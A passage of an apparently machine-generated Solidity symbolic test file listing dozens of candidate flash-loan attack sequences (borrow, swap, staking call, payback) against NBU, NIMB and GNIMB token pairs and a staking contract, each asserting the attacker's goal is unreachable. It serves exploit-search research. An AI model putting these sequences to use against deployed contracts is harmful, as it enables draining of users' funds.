        vm.stopPrank();
    }

    function check_cand3283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
